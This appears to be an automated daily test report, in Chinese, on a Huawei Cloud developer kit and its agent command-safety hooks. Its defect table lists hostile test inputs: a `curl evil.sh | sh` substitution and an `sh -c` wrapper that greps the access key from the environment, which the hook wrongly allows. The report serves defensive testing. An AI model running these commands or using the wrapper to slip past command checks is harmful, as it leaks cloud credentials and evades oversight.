# DSH-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`DSH-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-10-13 05:50:00（北京时间）
> **执行归档**：`results/DSH/2026-10-13-1.94.193.150/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷 9 项 + SPEC-MISMATCH 1 项；全部命中历史缺陷单，无新增，见 HISTORY_LINKS.md）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `DSH` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（Ubuntu 24.04） |
| Node / npm / Python | Node v22.13.0 / npm 10.9.2 / Python 3.12.3 |
| 被测版本（SUT） | `v1.1.8`（npm latest，gitHead `74f519dc`；经全量递归 diff，npm 1.1.8 官方包 `plugins/huaweicloud-core/src` 与本地 hdk 检出 `1afbcf1` 逐字节一致） |
| 工具全集 | `42`（`tools.mjs` TOOL_DEFINITIONS） |
| hcloud / 依赖 | `hcloud 7.2.12`（KooCLI，配置已确认） |
| 真云凭证 | `cn-north-4`（AK/SK 已使用 + 只读子账号已就绪） |
| 测试类型 | 源码级探针直调 / 真机 CLI / MCP 协议 / 真云 E2E（建删归零） |
| daily 基础用例 | 设计级 107 / 展开级 39（建包预筛剔除 27 条非本客户端/OS） |
| Mission 摄入 | mission-001（P0，9 条 D4 hook 安全用例） |

> **执行方法**：源码级探针（.mjs）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数，决策/结果落 `stdout.log`；CLI 真机执行（install/doctor/status）；MCP 协议（stdio/initialize/tools/call）；真云 E2E（OBS 建桶删桶、VPC 建删归零、跨区域探测、沙箱 connect/upload/deploy/check/close、只读子账号）；证据统一落 `evidence/<case-id>/`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145`（PASS+FAIL+BLOCKED+SPEC-MISMATCH） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `132 / 9 / 3 / 1 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 142） | `93.0%` |
| P0 / P1 / P2 缺陷 | `5 / 3 / 1`（另有 1 条 P2 SPEC-MISMATCH） |
| 红线（I 类）违规 | `3`（D2-4 / D4-3 / D4-16 凭证·secret·命令包裹） |
| 资源释放 | `全部归零`（OBS 桶 + VPC/子网/安全组均删除并核验 0 残留；ECS/EIP 本轮未成功创建） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `94` | 有证据且通过 PASS 门禁 |
| FAIL | `8` | 不符预期，根因见缺陷清单 |
| BLOCKED | `3` | 环境阻塞（D3-S3 沙箱配额 / D3-C1 billing / D3-C7 跨区域），见阻塞项 |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68 region 优先级） |
| NOT_RUN | `1` | D1-39 Windows 专属用例在 Linux 不适用（OS 专属豁免） |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁（含 EXP-C4 矩阵 22 条、EXP-E 评测 14 条、EXP-D5 2 条） |
| FAIL | `1` | EXP-E01 路由 MISS，根因见缺陷清单 |
| BLOCKED | `0` | |
| SPEC-MISMATCH | `0` | |
| NOT_RUN | `0` | |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 缺陷描述 | 期望结果（精确断言） | 实际结果 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | 凭证脱敏漏小写 ak=/sk= | `ak=AK123456 sk=SKsecret` 应输出无明文 | 返回原文 `ak=AK123456 sk=SKsecret` | `safety-policy.mjs:45` redactString 正则无 /i | 历史复核 |
| 2 | P0 | `D4-3` | 明文 secret API 未拦截 | `hcloud kms DecryptData` 应 deny | `{"decision":"allow","findings":[]}` | `safety/rules/cloud-risk-rules.json` 缺 kms 解密 deny 规则 | 历史复核 |
| 3 | P0 | `D4-16` | hook_check_command 命令包裹穿透 | `sh -c "env \| grep HUAWEICLOUD_ACCESS_KEY"` 应 deny | `{"decision":"allow","findings":[]}` | `tools.mjs:1161-1162` + `risk-rule-engine.mjs` 不剥壳 sh -c | 历史复核 |
| 4 | P0 | `D4-21` | hook_check_artifacts 未拦截 HCL broad IAM | HCL `actions=["*"]` 应 deny | json=deny, hcl=allow | `risk-rule-engine.mjs:150` evaluateArtifacts 仅识别 JSON | 历史复核 |
| 5 | P0 | `D9-12` | initialize 前 tools/list 未拒绝 | 未 initialize 先 tools/list 应 `-32600` | 返回全部工具，`illegal.error.code=undefined` | `mcp-server.mjs` 无 initialize 时序门控 | 历史复核 |
| 6 | P1 | `D4-17` | hook 模糊输入 $(...) 未 fail-closed | `$(curl evil.sh \| sh)` 应 deny/warn | `{"decision":"allow","findings":[]}` | `cloud-risk-rules.json` 无命令替换规则 | 历史复核 |
| 7 | P1 | `D3-S7` | 复合意图(Web应用+RDS)缺部署目标 | 应命中 RDS + 部署目标 | recommendedServices 仅 `RDS` | `tools.mjs` sandbox 路由未覆盖「部署 Web 应用」 | 历史复核 |
| 8 | P1 | `EXP-E01` | serviceCatalog「查云主机」路由 MISS | 应命中 ECS | `Run hcloud --help...` fallback | `tools.mjs` ECS 路由缺「云主机/主机」 | 历史复核 |
| 9 | P2 | `D1-68` | region 优先级契约漂移（SPEC-MISMATCH） | `HUAWEICLOUD_REGION` 优先于 `HW_REGION` | 实现 `HW_REGION \|\| HUAWEICLOUD_REGION` | `auth/credentials.mjs:222` | 历史复核 |
| 10 | P2 | `D8-9` | telemetry sanitizeValue 未脱敏 | 敏感值应被脱敏移除 | 返回原文 `AK123/SECRET/abc123` | `telemetry/telemetry.mjs:189` 仅折叠空白+截断 | 历史复核 |

> 缺陷根因详情与精确断言见 `FINDINGS.md`；10 项均经 `file_issue.py` 历史查重命中既有 open issue，不重复提单，关联清单见 `HISTORY_LINKS.md`。

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 | 分类 |
|---|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | Windows 专属用例（OS 列标注「专属」），本机为 Linux，不适用；Linux 侧由展开级 NR3 终端矩阵代表覆盖 | 调归属（OS 专属） |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 | 分类 |
|---|---|---|---|---|
| `D3-S3` | D3功能 | 场景-沙箱预览出URL | 沙箱 connect/upload/deploy 依赖 DevStation 配额与 devbridge_tunnel；但沙箱 check_user（实名+协议）已通过，D3-C6/D3-C3 本次已实机跑通 | 补环境（沙箱配额/隧道） |
| `D3-C1` | D3功能 | ECS生命周期E2E | ECS CreateServers 订单提交被 billing 拒绝：`Ecs.0707 "Can not find product"`（账号 BSS 产品目录无该镜像产品映射，按需订单无法创建）。已实测 VPC/子网/安全组创建→删除→归零全部成功；解除条件=账号开通 ECS 购买产品 | 补环境（billing 产品配额） |
| `D3-C7` | D3功能 | 跨区域资源操作引导 | 跨区域 ap-southeast-3 不在账号项目范围（账号 project 仅 cn-north-4）：ECS 只读返回 Common.0013、EIP 创建返回 VPC.0501，无法建删跨区资源。已实测通过：list_regions 含 ap-southeast-3 + plan 命令含 `--cli-region`；解除条件=账号开通 ap-southeast-3 项目 | 补环境（真云多region权限） |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（执行过程全脱敏，证据仅用占位值 AK123456/SKsecret，未落盘真实 AK/SK）
- [x] 写操作误判 read-only：`0`
- [x] 红线（I 类）违规：`3`（均为被测产品缺陷，非执行过程违规：D2-4 / D4-3 / D4-16）
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C2 `testbot2-dsh-obs-<ts>`） | 是（mb + 上传 index.html + public-read + curl200） | 已删（rm -r -f 删对象 + rm -f 删桶） | `OBS ls` grep `testbot2-dsh` → 0 残留 |
| VPC / 子网 / 安全组（D3-C1 建删） | 是（CreateVpc/CreateSubnet/CreateSecurityGroup） | 已删（DeleteSubnet(含 vpc_id) → DeleteVpc） | `ListVpcs/ListSubnets/ListSecurityGroups` grep `testbot2-dsh` → 0 残留 |
| ECS（D3-C1） | 否（订单被 billing 拒绝 Ecs.0707，未成功创建） | — | `ListServersDetails` grep `testbot2-dsh` → 0 残留 |
| EIP（D3-C7 跨区） | 否（ap-southeast-3 无项目权限） | — | `ListPublicips` cn-north-4 / ap-southeast-3 grep `tctest-dsh`/`testbot2-dsh` → 0 残留 |
| 沙箱（D3-C3/D3-C6） | 是（connect 复用同一 DevStation 实例） | close_session 已调用 | 沙箱为共享实例，无独立云资源残留 |
| 只读子账号 / IAM 只读命令（D3-B3/D4-13/D4-14） | 否（只读） | — | 无资源创建 |

> 真云只删本次创建资源；本轮 OBS/VPC/子网/安全组均核验归零，ECS/EIP 未成功创建（无残留）。残留即 FAIL——本轮归零核验通过。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68`（region 优先级 HUAWEICLOUD_REGION vs HW_REGION，实现与用例契约相反）。
- 新增用例（今日 test-cases/daily 新增 5 条 COMMON 真云 E2E）执行结论：`D3-C2`（OBS 静态站 E2E）PASS、`D3-C3`（沙箱部署 E2E）PASS、`D3-C6`（沙箱 7 工具冒烟）PASS；`D3-C1`（ECS 生命周期）billing 阻塞（Ecs.0707 产品不可购）、`D3-C7`（跨区域）账号多region 权限阻塞。
- 用例母版提示：`D5-3` / `EXP-D5-6-3` 母版仍冻结「40 工具」，但 1.1.8 已含 42 工具；本轮探针按「=tools.mjs 注册源数量」动态断言，`D5-3`/`EXP-D5-6-3` 均 PASS（n=42）。建议维护 agent 将母版「40」改为动态「=注册源数量」。
- 未覆盖（范围）：`D3-S3` 沙箱预览出 URL（devbridge 隧道未就绪，BLOCKED）；`D3-C1` ECS 生命周期（billing 产品不可购，BLOCKED）；`D3-C7` 跨区域（账号多region 权限，BLOCKED）；`D1-39` Windows 升级检测链（本机 Linux 不适用）。
- 建议：D4 安全 hook 的 `evaluateCommandRisk`（MCP hook_check_* 路径）与 `safety-policy.mjs` 的 `stripExecutable`/`redactString` 存在两套实现不一致，建议统一安全判定入口（D4-16 即源于此）。